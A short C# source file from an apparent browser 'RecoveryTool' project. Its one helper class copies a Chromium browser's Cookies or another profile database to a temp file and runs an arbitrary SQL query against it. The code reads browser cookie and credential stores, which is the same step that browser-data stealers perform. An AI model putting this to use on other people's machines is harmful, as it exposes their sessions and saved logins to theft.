using RecoveryTool.Recovery.Utilities;
using System.Data.SQLite;

namespace RecoveryTool.Recovery.Browsers.Chromium
{
    public class ChromiumRepository
    {
        public static async Task<SQLiteDataReader?> ExecuteSqliteQueryAsync(string browserName, string dbName, string query)
        {
            string baseSearchPath = Path.Combine(Common.LocalData, ChromiumCommon.BrowserDirectories[browserName]);
            string fullPath = dbName == "Cookies" ?
                              Path.Combine(baseSearchPath, "Default", "Network", dbName) :
                              Path.Combine(baseSearchPath, "Default", dbName);

            if (!File.Exists(fullPath)) return null;

            string tempFilePath = Path.GetTempFileName();

            try
            {
                File.Copy(fullPath, tempFilePath, true);
            } catch { }

            var connection = new SQLiteConnection($"Data Source={tempFilePath};");
            await connection.OpenAsync();
            var command = new SQLiteCommand(query, connection);
            return (SQLiteDataReader)await command.ExecuteReaderAsync();
        }
    }
}